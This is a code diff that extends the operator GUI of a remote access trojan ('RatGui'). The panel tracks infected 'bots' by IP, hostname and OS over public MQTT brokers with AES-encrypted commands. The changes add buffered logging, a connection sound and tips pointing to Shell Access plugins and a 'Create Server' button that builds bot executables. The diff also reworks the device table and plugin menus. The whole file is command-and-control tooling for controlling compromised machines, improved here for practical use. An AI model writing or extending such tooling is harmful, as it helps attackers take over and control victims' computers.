@@ -10,8 +10,9 @@ from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout,
                              QPushButton, QTextEdit, QToolBar, QTableWidget, 
                              QTableWidgetItem, QMenu, QStatusBar, QDialog, 
                              QFormLayout, QLineEdit, QLabel, QComboBox)
-from PyQt6.QtCore import Qt, QTimer, QDateTime, pyqtSignal, QObject, QThread
+from PyQt6.QtCore import Qt, QTimer, QDateTime, pyqtSignal, QObject, QThread, QPropertyAnimation, QEasingCurve, QRect, QUrl
 from PyQt6.QtGui import QIcon
+from PyQt6.QtMultimedia import QMediaPlayer, QAudioOutput
 import paho.mqtt.client as mqtt
 from paho.mqtt.client import CallbackAPIVersion
 import ujson as json
@@ -20,6 +21,8 @@ from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 import base64
 import time
+import queue
+import threading
 
 class MqttSignalHandler(QObject):
     message_received = pyqtSignal(dict)
@@ -109,7 +112,7 @@ class ServerDialog(QDialog):
         self.broker_url.setCurrentText('broker.hivemq.com')
         self.api_token = QLineEdit()
         self.api_token.setPlaceholderText('API Token (optional for flespi)')
-        self.encryption_key = QLineEdit(default_key)  # Default encryption key from settings.json
+        self.encryption_key = QLineEdit(default_key)
         self.topic = QLineEdit(topic)
         layout.addRow('Bot Name:', self.bot_name)
         layout.addRow('Bot ID:', self.bot_id)
@@ -275,7 +278,31 @@ class RatGui(QMainWindow):
                 font-family: 'Courier New';
                 font-size: 12px;
             }
+            QLabel#tipsLabel {
+                color: #00ff00;
+                font-family: 'Courier New';
+                font-size: 12px;
+                padding: 5px;
+            }
         """)
+
+        self.device_table_updates = []
+        self.log_buffer = []
+        self.device_table_changed = False
+        self.add_bots = False
+        self.remove_bots = False
+        self.all_bots = []
+        self.ui_update_timer = QTimer()
+        self.ui_update_timer.timeout.connect(self.flush_ui_updates)
+        self.ui_update_timer.start(1000)
+
+        self.audio_output = QAudioOutput()
+        self.media_player = QMediaPlayer()
+        self.media_player.setAudioOutput(self.audio_output)
+        self.media_player.setSource(QUrl.fromLocalFile("audio\\notification.wav"))
+        self.last_sound_time = 0
+        self.connect_count = 0
+        self.sound_window = 1.0
 
         try:
             icon_path = os.path.join('icon', 'icon.ico')
@@ -335,6 +362,26 @@ class RatGui(QMainWindow):
         self.log_area.customContextMenuRequested.connect(self.show_log_context_menu)
         main_layout.addWidget(self.log_area)
 
+        self.tips_label = QLabel()
+        self.tips_label.setObjectName("tipsLabel")
+        self.tips_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
+        self.tips = [
+            "In Shell Access, type commands like 'dir' to list files or 'cd folder' to navigate.",
+            "Right-click on a bot in the device table to access plugins like Shell Access or Send Message.",
+            "Use the 'Create Server' button to generate a new bot executable."
+        ]
+        self.current_tip_index = 0
+        self.tips_label.setText(self.tips[self.current_tip_index])
+        self.tips_label.setMinimumWidth(600)
+        main_layout.addWidget(self.tips_label)
+
+        self.tips_timer = QTimer()
+        self.tips_timer.timeout.connect(self.update_tip)
+        self.tips_timer.start(10000)
+        self.tips_animation = QPropertyAnimation(self.tips_label, b"geometry")
+        self.tips_animation.setDuration(2000)
+        self.tips_animation.setEasingCurve(QEasingCurve.Type.InOutQuad)
+
         self.timer = QTimer()
         self.timer.timeout.connect(self.update_device_status)
         self.timer.start(10000)
@@ -353,7 +400,7 @@ class RatGui(QMainWindow):
         self.broker_port = 1883
         self.topic = '/commands/'
         self.broker_history = ['broker.hivemq.com', 'mqtt.flespi.io']
-        self.encryption_key = '1234'  # Default encryption key
+        self.encryption_key = '1234'
         self.plugins = load_plugins(self)
         self.is_connected = False
 
@@ -362,12 +409,92 @@ class RatGui(QMainWindow):
             os.makedirs(self.data_dir)
         self.settings_file = os.path.join(self.data_dir, 'settings.json')
         self.json_file = os.path.join(self.data_dir, 'connections.json')
-        self.load_settings()  # Load encryption key from settings.json
+        self.load_settings()
         self.load_connections()
         self.connect_to_broker()
 
+        self.message_queue = queue.Queue()
+        self.message_thread = threading.Thread(target=self.process_messages)
+        self.message_thread.daemon = True
+        self.message_thread.start()
+
+    def queue_message(self, data):
+        self.message_queue.put(data)
+
+    def process_messages(self):
+        while True:
+            try:
+                message = self.message_queue.get(timeout=1.0)
+                self.handle_message(message)
+            except queue.Empty:
+                continue
+            time.sleep(0.02)
+
+    def flush_ui_updates(self):
+        if self.device_table_updates:
+            for update in self.device_table_updates:
+                ip, hostname, os_info, status, last_ping, bot_id, row, target = update
+                self.device_table.setItem(row, 0, QTableWidgetItem(ip))
+                self.device_table.setItem(row, 1, QTableWidgetItem(hostname))
+                self.device_table.setItem(row, 2, QTableWidgetItem(os_info))
+                self.device_table.setItem(row, 3, QTableWidgetItem(status))
+                self.device_table.setItem(row, 4, QTableWidgetItem(last_ping))
+                self.device_table.setItem(row, 5, QTableWidgetItem(bot_id))
+                self.device_status[target] = {'status': status, 'last_beacon': QDateTime.currentDateTime()}
+            self.device_table_updates.clear()
+            self.device_table_changed = True
+
+        for log_message in self.log_buffer:
+            self.log_area.append(log_message)
+        self.log_buffer.clear()
+
+        if (self.add_bots or self.remove_bots) and self.device_table_changed:
+            self.save_connections()
+            self.add_bots = False
+            self.remove_bots = False
+            self.device_table_changed = False
+
+    def log_buffered(self, message):
+        self.log_buffer.append(message)
+
+    def play_connect_sound(self):
+        current_time = time.time()
+        if current_time - self.last_sound_time < self.sound_window:
+            self.connect_count += 1
+        else:
+            self.connect_count = 1
+            self.last_sound_time = current_time
+
+        if self.connect_count == 1:
+            self.media_player.play()
+        elif self.connect_count < 100 and current_time - self.last_sound_time >= 1.0:
+            self.media_player.play()
+            self.last_sound_time = current_time
+        elif self.connect_count == 100:
+            self.media_player.play()
+            self.last_sound_time = current_time
+
+    def update_tip(self):
+        geom = self.tips_label.geometry()
+        start_rect = QRect(geom.x(), geom.y(), geom.width(), geom.height())
+        end_rect = QRect(-geom.width(), geom.y(), geom.width(), geom.height())
+        self.tips_animation.setStartValue(start_rect)
+        self.tips_animation.setEndValue(end_rect)
+        self.tips_animation.start()
+        
+        QTimer.singleShot(2000, self.switch_tip)
+
+    def switch_tip(self):
+        self.current_tip_index = (self.current_tip_index + 1) % len(self.tips)
+        self.tips_label.setText(self.tips[self.current_tip_index])
+        geom = self.tips_label.geometry()
+        start_rect = QRect(self.tips_label.parent().width(), geom.y(), geom.width(), geom.height())
+        end_rect = QRect(0, geom.y(), geom.width(), geom.height())
+        self.tips_animation.setStartValue(start_rect)
+        self.tips_animation.setEndValue(end_rect)
+        self.tips_animation.start()
+
     def load_settings(self):
-        """Load settings from settings.json, including the encryption key."""
         try:
             if os.path.exists(self.settings_file):
                 with open(self.settings_file, 'r') as f:
@@ -377,15 +504,14 @@ class RatGui(QMainWindow):
                 self.broker_port = int(settings.get('broker_port', 1883))
                 self.topic = settings.get('topic', '/commands/')
                 self.broker_history = settings.get('broker_history', ['broker.hivemq.com', 'mqtt.flespi.io'])
-                self.log_area.append(f"Loaded settings from {self.settings_file}")
+                self.log_buffered(f"Loaded settings from {self.settings_file}")
             else:
-                self.save_settings()  # Create default settings file
-                self.log_area.append("No settings file found, created default settings")
+                self.save_settings()
+                self.log_buffered("No settings file found, created default settings")
         except Exception as e:
-            self.log_area.append(f"Error loading settings: {e}")
+            self.log_buffered(f"Error loading settings: {e}")
 
     def save_settings(self):
-        """Save settings to settings.json, including the encryption key."""
         try:
             settings = {
                 'encryption_key': self.encryption_key,
@@ -396,55 +522,51 @@ class RatGui(QMainWindow):
             }
             with open(self.settings_file, 'w') as f:
                 json.dump(settings, f, indent=4)
-            self.log_area.append(f"Saved settings to {self.settings_file}")
+            self.log_buffered(f"Saved settings to {self.settings_file}")
         except Exception as e:
-            self.log_area.append(f"Error saving settings: {e}")
+            self.log_buffered(f"Error saving settings: {e}")
 
     def encrypt_message(self, message):
-        """Encrypt a message using AES-GCM with the global encryption key."""
         key = self.encryption_key.encode('utf-8')
-        # Ensure the key is 16, 24, or 32 bytes long (AES-128, AES-192, AES-256)
         if len(key) < 16:
-            key = key.ljust(16, b'\0')  # Pad with null bytes
+            key = key.ljust(16, b'\0')
         elif len(key) > 16 and len(key) < 24:
             key = key.ljust(24, b'\0')
         elif len(key) > 24 and len(key) < 32:
             key = key.ljust(32, b'\0')
         else:
-            key = key[:32]  # Truncate to AES-256 length if too long
-        nonce = get_random_bytes(12)  # Explicitly use a 12-byte nonce to match Go
+            key = key[:32]
+        nonce = get_random_bytes(12)
         cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
         ciphertext, tag = cipher.encrypt_and_digest(message.encode('utf-8'))
         encrypted = nonce + ciphertext + tag
-        self.log_area.append(f"GUI Encrypt: nonce_len={len(nonce)}, ciphertext_len={len(ciphertext)}, tag_len={len(tag)}")
         encrypted_b64 = base64.b64encode(encrypted).decode('utf-8')
+        self.log_buffered(f"GUI Encrypt: nonce_len={len(nonce)}, ciphertext_len={len(ciphertext)}, tag_len={len(tag)}")
         return encrypted_b64
 
     def decrypt_message(self, encrypted_message):
-        """Decrypt an encrypted message using AES-GCM with the global encryption key."""
         key = self.encryption_key.encode('utf-8')
-        # Ensure the key is 16, 24, or 32 bytes long (AES-128, AES-192, AES-256)
         if len(key) < 16:
-            key = key.ljust(16, b'\0')  # Pad with null bytes
+            key = key.ljust(16, b'\0')
         elif len(key) > 16 and len(key) < 24:
             key = key.ljust(24, b'\0')
         elif len(key) > 24 and len(key) < 32:
             key = key.ljust(32, b'\0')
         else:
-            key = key[:32]  # Truncate to AES-256 length if too long
+            key = key[:32]
         try:
             encrypted_data = base64.b64decode(encrypted_message)
-            self.log_area.append(f"GUI Decrypt: encrypted_data_len={len(encrypted_data)}")
-            nonce = encrypted_data[:12]  # GCM nonce is 12 bytes
-            tag = encrypted_data[-16:]   # Tag is 16 bytes
+            self.log_buffered(f"GUI Decrypt: encrypted_data_len={len(encrypted_data)}")
+            nonce = encrypted_data[:12]
+            tag = encrypted_data[-16:]
             ciphertext = encrypted_data[12:-16]
-            self.log_area.append(f"GUI Decrypt: nonce_len={len(nonce)}, ciphertext_len={len(ciphertext)}, tag_len={len(tag)}")
+            self.log_buffered(f"GUI Decrypt: nonce_len={len(nonce)}, ciphertext_len={len(ciphertext)}, tag_len={len(tag)}")
             cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
             plaintext = cipher.decrypt_and_verify(ciphertext, tag)
             return plaintext.decode('utf-8')
         except Exception as e:
-            self.log_area.append(f"Error decrypting message: {e}")
-            return encrypted_message  # Fallback to plaintext on error
+            self.log_buffered(f"Error decrypting message: {e}")
+            return encrypted_message
 
     def filter_bots(self, text):
         try:
@@ -458,13 +580,14 @@ class RatGui(QMainWindow):
                         break
                 self.device_table.setRowHidden(row, not match)
         except Exception as e:
-            self.log_area.append(f"Error filtering bots: {e}")
+            self.log_buffered(f"Error filtering bots: {e}")
 
     def load_connections(self):
         try:
             if os.path.exists(self.json_file):
                 with open(self.json_file, 'r') as f:
                     bots = json.load(f)
+                self.all_bots = bots
                 for bot_data in bots:
                     bot_id = bot_data['id']
                     ip = bot_data.get('ip', 'Unknown')
@@ -480,77 +603,63 @@ class RatGui(QMainWindow):
                     self.device_table.setItem(row, 4, QTableWidgetItem('N/A'))
                     self.device_table.setItem(row, 5, QTableWidgetItem(bot_id))
                     self.device_status[target] = {'status': 'Disconnected', 'last_beacon': QDateTime.currentDateTime()}
-                self.log_area.append(f"Loaded {len(bots)} bots from {self.json_file}")
+                self.log_buffered(f"Loaded {len(bots)} bots from {self.json_file}")
                 self.update_connected_count()
             else:
-                self.log_area.append("No connections JSON file found, starting fresh")
+                self.log_buffered("No connections JSON file found, starting fresh")
                 self.status_bar.showMessage(f"{self.connected_bots_count} connected")
         except Exception as e:
-            self.log_area.append(f"Error loading connections: {e}")
+            self.log_buffered(f"Error loading connections: {e}")
 
     def save_connections(self):
         try:
-            bots = []
-            for row in range(self.device_table.rowCount()):
-                bot_id = self.device_table.item(row, 5).text()
-                ip = self.device_table.item(row, 0).text()
-                hostname = self.device_table.item(row, 1).text()
-                os_info = self.device_table.item(row, 2).text()
-                bot_data = {
-                    'id': bot_id,
-                    'ip': ip,
-                    'hostname': hostname,
-                    'os': os_info
-                }
-                bots.append(bot_data)
             with open(self.json_file, 'w') as f:
-                json.dump(bots, f, indent=4)
-            self.log_area.append(f"Saved {len(bots)} bots to {self.json_file}")
+                json.dump(self.all_bots, f, indent=4)
+            self.log_buffered(f"Saved {len(self.all_bots)} bots to {self.json_file}")
             self.update_connected_count()
         except Exception as e:
-            self.log_area.append(f"Error saving connections: {e}")
+            self.log_buffered(f"Error saving connections: {e}")
 
     def connect_to_broker(self):
         try:
             self.client.connect(self.broker_url, self.broker_port, 120)
             self.client.loop_start()
-            self.log_area.append(f"Connected to {self.broker_url}")
+            self.log_buffered(f"Connected to {self.broker_url}")
             self.is_connected = True
         except Exception as e:
-            self.log_area.append(f"Error connecting to broker: {e}")
+            self.log_buffered(f"Error connecting to broker: {e}")
             self.is_connected = False
 
     def on_connect(self, client, userdata, flags, reason_code, properties=None):
         try:
             if reason_code == 0:
                 client.publish(self.topic, payload=None, qos=1, retain=True)
-                self.log_area.append(f"GUI cleared retained messages on topic {self.topic}")
+                self.log_buffered(f"GUI cleared retained messages on topic {self.topic}")
                 client.subscribe(self.topic, qos=1)
-                self.log_area.append("Connected to MQTT broker")
+                self.log_buffered("Connected to MQTT broker")
                 self.status_bar.showMessage(f"{self.connected_bots_count} connected")
                 self.is_connected = True
             else:
-                self.log_area.append(f"GUI connection failed with code {reason_code}")
+                self.log_buffered(f"GUI connection failed with code {reason_code}")
                 self.status_bar.showMessage(f"{self.connected_bots_count} connected")
                 self.is_connected = False
         except Exception as e:
-            self.log_area.append(f"Error in on_connect: {e}")
+            self.log_buffered(f"Error in on_connect: {e}")
 
     def on_disconnect(self, client, userdata, rc, properties=None, reason=None):
         try:
-            self.log_area.append(f"GUI disconnected from MQTT broker with code {rc}")
+            self.log_buffered(f"GUI disconnected from MQTT broker with code {rc}")
             if reason:
-                self.log_area.append(f"Disconnect reason: {reason}")
+                self.log_buffered(f"Disconnect reason: {reason}")
             self.status_bar.showMessage(f"{self.connected_bots_count} connected")
             self.is_connected = False
             self.client.loop_stop()
             self.connect_to_broker()
         except Exception as e:
-            self.log_area.append(f"Error in on_disconnect: {e}")
+            self.log_buffered(f"Error in on_disconnect: {e}")
 
     def on_log(self, client, userdata, level, buf):
         try:
-            # self.log_area.append(f"MQTT Log: {buf}")
             pass
         except Exception as e:
             print(f"Error in on_log: {e}")
@@ -559,38 +668,78 @@ class RatGui(QMainWindow):
         try:
             message = msg.payload.decode('utf-8')
             if not message:
-                self.log_area.append("GUI received empty message, ignoring")
+                self.log_buffered("GUI received empty message, ignoring")
                 return
-
-            # Decrypt the message using the global key
-            message = self.decrypt_message(message)
-            data = json.loads(message)
-            self.signal_handler.message_received.emit(data)
+            try:
+                decrypted_message = self.decrypt_message(message)
+                data = json.loads(decrypted_message)
+                if decrypted_message != message:
+                    data['_encryption_status'] = 'encrypted'
+                else:
+                    data['_encryption_status'] = 'plaintext'
+                self.signal_handler.message_received.emit(data)
+            except json.JSONDecodeError:
+                self.log_buffered(f"Error decoding message as JSON: {message}")
         except Exception as e:
-            self.log_area.append(f"Error processing message: {e}")
+            self.log_buffered(f"Error processing message: {e}")
 
     def handle_message(self, data):
         start_time = time.time()
         try:
-            # Handle connect messages for updating the device table
+            encryption_status = data.pop('_encryption_status', 'unknown')
             if data.get('type') == 'connect':
                 print(f"GUI processing connect message: {data}")
-                self.update_device_table(data)
-                self.update_connected_count()
-
-            # Dispatch all messages to plugins, including connect messages
+                self.queue_device_table_update(data)
+                self.play_connect_sound()
             for plugin in self.plugins:
                 plugin_start = time.time()
-                self.log_area.append(f"GUI dispatching message to plugin: {plugin.name}")
+                self.log_buffered(f"GUI dispatching message to plugin: {plugin.name}")
                 plugin.handle_response(data)
                 plugin_end = time.time()
-                self.log_area.append(f"Plugin {plugin.name} took {plugin_end - plugin_start:.2f} seconds")
-            self.log_area.append(f"GUI received message on topic {self.topic}: {json.dumps(data)}")
+                self.log_buffered(f"Plugin {plugin.name} took {plugin_end - plugin_start:.2f} seconds")
+            self.log_buffered(f"GUI received message on topic {self.topic}: {encryption_status} {json.dumps(data)}")
         except Exception as e:
-            self.log_area.append(f"Error handling message: {e}")
+            self.log_buffered(f"Error handling message: {e}")
         finally:
             end_time = time.time()
-            self.log_area.append(f"Total message handling took {end_time - start_time:.2f} seconds")
+            self.log_buffered(f"Total message handling took {end_time - start_time:.2f} seconds")
+
+    def queue_device_table_update(self, data):
+        bot_id = data['id']
+        ip = data.get('ip', 'Unknown')
+        os_info = data.get('os', 'Unknown')
+        hostname = data.get('hostname', 'Unknown')
+        target = f"{ip}:{bot_id}"
+        bot_data = {
+            'id': bot_id,
+            'ip': ip,
+            'hostname': hostname,
+            'os': os_info
+        }
+        new_bot = not any(bot['id'] == bot_id and bot['ip'] == ip for bot in self.all_bots)
+        if new_bot:
+            self.all_bots.append(bot_data)
+            self.add_bots = True
+        found = False
+        for row in range(self.device_table.rowCount()):
+            table_ip = self.device_table.item(row, 0).text()
+            table_bot_id = self.device_table.item(row, 5).text()
+            table_target = f"{table_ip}:{table_bot_id}"
+            if table_target == target:
+                self.device_table_updates.append((
+                    ip, hostname, os_info, 'Connected',
+                    QDateTime.currentDateTime().toString(), bot_id, row, target
+                ))
+                found = True
+                break
+        if not found:
+            row = self.device_table.rowCount()
+            self.device_table.insertRow(row)
+            self.device_table_updates.append((
+                ip, hostname, os_info, 'Connected',
+                QDateTime.currentDateTime().toString(), bot_id, row, target
+            ))
+        self.device_table_changed = True
 
     def open_settings(self):
         try:
@@ -599,8 +748,8 @@ class RatGui(QMainWindow):
                 self.broker_url = dialog.broker_url.currentText()
                 self.broker_port = int(dialog.broker_port.text())
                 self.topic = dialog.topic.text()
-                self.encryption_key = dialog.encryption_key.text()  # Update global encryption key
-                self.save_settings()  # Save updated settings
+                self.encryption_key = dialog.encryption_key.text()
+                self.save_settings()
                 if self.broker_url not in self.broker_history:
                     self.broker_history.append(self.broker_url)
                 self.client.disconnect()
@@ -612,7 +761,7 @@ class RatGui(QMainWindow):
                 self.client.on_log = self.on_log
                 self.connect_to_broker()
         except Exception as e:
-            self.log_area.append(f"Error in open_settings: {e}")
+            self.log_buffered(f"Error in open_settings: {e}")
 
     def create_server(self):
         try:
@@ -628,10 +777,10 @@ class RatGui(QMainWindow):
                 self.generator_thread.finished.connect(self.on_server_generation_finished)
                 self.generator_thread.start()
         except Exception as e:
-            self.log_area.append(f"Error in create_server: {e}")
+            self.log_buffered(f"Error in create_server: {e}")
 
     def on_server_generation_finished(self, message):
-        self.log_area.append(message)
+        self.log_buffered(message)
         self.create_server_button.setEnabled(True)
 
     def update_device_table(self, data):
@@ -647,28 +796,22 @@ class RatGui(QMainWindow):
                 table_bot_id = self.device_table.item(row, 5).text()
                 table_target = f"{table_ip}:{table_bot_id}"
                 if table_target == target:
-                    self.device_table.setItem(row, 0, QTableWidgetItem(ip))
-                    self.device_table.setItem(row, 1, QTableWidgetItem(hostname))
-                    self.device_table.setItem(row, 2, QTableWidgetItem(os_info))
-                    self.device_table.setItem(row, 3, QTableWidgetItem('Connected'))
-                    self.device_table.setItem(row, 4, QTableWidgetItem(QDateTime.currentDateTime().toString()))
-                    self.device_table.setItem(row, 5, QTableWidgetItem(bot_id))
-                    self.device_status[target] = {'status': 'Connected', 'last_beacon': QDateTime.currentDateTime()}
+                    self.device_table_updates.append((
+                        ip, hostname, os_info, 'Connected',
+                        QDateTime.currentDateTime().toString(), bot_id, row, target
+                    ))
                     found = True
                     break
             if not found:
                 row = self.device_table.rowCount()
                 self.device_table.insertRow(row)
-                self.device_table.setItem(row, 0, QTableWidgetItem(ip))
-                self.device_table.setItem(row, 1, QTableWidgetItem(hostname))
-                self.device_table.setItem(row, 2, QTableWidgetItem(os_info))
-                self.device_table.setItem(row, 3, QTableWidgetItem('Connected'))
-                self.device_table.setItem(row, 4, QTableWidgetItem(QDateTime.currentDateTime().toString()))
-                self.device_table.setItem(row, 5, QTableWidgetItem(bot_id))
-                self.device_status[target] = {'status': 'Connected', 'last_beacon': QDateTime.currentDateTime()}
-                self.save_connections()  # Ensure new bot is saved to connections.json
+                self.device_table_updates.append((
+                    ip, hostname, os_info, 'Connected',
+                    QDateTime.currentDateTime().toString(), bot_id, row, target
+                ))
+            self.device_table_changed = True
         except Exception as e:
-            self.log_area.append(f"Error updating device table: {e}")
+            self.log_buffered(f"Error updating device table: {e}")
 
     def show_context_menu(self, position):
         try:
@@ -681,25 +824,23 @@ class RatGui(QMainWindow):
                 target = f"{ip}:{bot_id}"
             else:
                 target = 'all'
-            # self.log_area.append(f"Populating context menu for target: {target}")
-            self.log_area.append(f"Total plugins loaded: {len(self.plugins)}")
-            for plugin in self.plugins:
-                # self.log_area.append(f"Adding plugin to context menu: {plugin.name}")
-                try:
-                    action_name = plugin.get_menu_action()
-                    # self.log_area.append(f"Plugin menu action: {action_name}")
-                    action = menu.addAction(action_name)
-                    action.triggered.connect(lambda checked, t=target, p=plugin: p.execute(t))
-                except Exception as e:
-                    self.log_area.append(f"Error adding plugin {plugin.name} to context menu: {e}")
+            self.log_buffered(f"Total plugins loaded: {len(self.plugins)}")
+            categories = {}
+            for plugin in sorted(self.plugins, key=lambda p: (getattr(p, 'category', 'Other'), getattr(p, 'priority', 0))):
+                category = getattr(plugin, 'category', 'Other')
+                if category not in categories:
+                    categories[category] = menu.addMenu(category)
+                action_name = plugin.get_menu_action()
+                action = categories[category].addAction(action_name)
+                action.triggered.connect(lambda checked, t=target, p=plugin: p.execute(t))
             if self.sender() == self.device_table:
                 menu.exec(self.device_table.mapToGlobal(position))
             else:
                 menu.exec(self.toolbar.mapToGlobal(position))
         except Exception as e:
-            self.log_area.append(f"Error showing context menu: {e}")
+            self.log_buffered(f"Error showing context menu: {e}")
 
-    def remove_device_from_table(self, ip, bot_id):
+    def remove_device_from_table(self, ip, bot_id, remove_from_all_bots=False):
         try:
             target = f"{ip}:{bot_id}"
             self.timer.stop()
@@ -708,13 +849,16 @@ class RatGui(QMainWindow):
                 table_bot_id = self.device_table.item(row, 5).text()
                 table_target = f"{table_ip}:{table_bot_id}"
                 if table_target == target:
+                    if remove_from_all_bots:
+                        self.all_bots = [bot for bot in self.all_bots if bot['id'] != bot_id or bot['ip'] != ip]
+                        self.remove_bots = True
                     self.device_table.removeRow(row)
                     if target in self.device_status:
                         del self.device_status[target]
                     break
-            self.save_connections()  # Update connections.json and connected count
+            self.device_table_changed = True
         except Exception as e:
-            self.log_area.append(f"Error removing device from table: {e}")
+            self.log_buffered(f"Error removing device from table: {e}")
         finally:
             self.timer.start(10000)
 
@@ -726,11 +870,12 @@ class RatGui(QMainWindow):
             if action == clear_action:
                 self.log_area.clear()
         except Exception as e:
-            self.log_area.append(f"Error showing log context menu: {e}")
+            self.log_buffered(f"Error showing log context menu: {e}")
 
     def update_device_status(self):
         try:
             current_time = QDateTime.currentDateTime()
+            table_changed = False
             for row in range(self.device_table.rowCount()):
                 bot_id = self.device_table.item(row, 5).text()
                 ip = self.device_table.item(row, 0).text()
@@ -743,17 +888,19 @@ class RatGui(QMainWindow):
                     if old_status != new_status:
                         self.device_status[target]['status'] = new_status
                         self.update_connected_count()
+                        table_changed = True
                     self.device_table.setItem(row, 3, QTableWidgetItem(new_status))
                     if new_status == 'Connected' and seconds_ago < 30:
                         last_ping_text = f"{seconds_ago} sec ago"
                     else:
                         last_ping_text = last_beacon.toString()
                     self.device_table.setItem(row, 4, QTableWidgetItem(last_ping_text))
+            if table_changed:
+                self.device_table_changed = True
         except Exception as e:
-            self.log_area.append(f"Error updating device status: {e}")
+            self.log_buffered(f"Error updating device status: {e}")
 
     def update_connected_count(self):
-        """Update connected bots count based on connections.json and their status."""
         try:
             if os.path.exists(self.json_file):
                 with open(self.json_file, 'r') as f:
@@ -767,13 +914,13 @@ class RatGui(QMainWindow):
                         self.connected_bots_count += 1
                 self.status_bar.showMessage(f"{self.connected_bots_count} connected")
         except Exception as e:
-            self.log_area.append(f"Error updating connected count: {e}")
+            self.log_buffered(f"Error updating connected count: {e}")
 
 def exception_hook(exctype, value, traceback_info):
     error_msg = ''.join(traceback.format_exception(exctype, value, traceback_info))
     print(f"Unhandled exception caught:\n{error_msg}")
     try:
-        window.log_area.append(f"Unhandled exception: {error_msg}")
+        window.log_buffered(f"Unhandled exception: {error_msg}")
     except:
         pass
 
